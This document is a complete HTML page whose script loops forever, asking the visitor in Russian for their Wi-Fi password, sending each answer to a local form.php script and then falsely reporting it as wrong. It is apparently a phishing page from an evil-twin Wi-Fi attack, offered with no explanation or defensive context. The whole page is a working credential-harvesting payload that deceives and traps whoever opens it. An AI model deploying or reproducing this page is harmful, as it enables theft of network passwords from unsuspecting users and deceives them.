<html>
  <head>
    <script>
      while(true){
        var inp = prompt("Чтобы продолжить, необходимо ввести пароль от wi-fi сети\nВведите пароль от WI-FI:");
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'form.php?pass='+inp, false);
        xhr.send();
        alert("Неверный пароль. Повторите попытку.");
      }
    </script>
  <head>
  <body>

  </body>
</html>
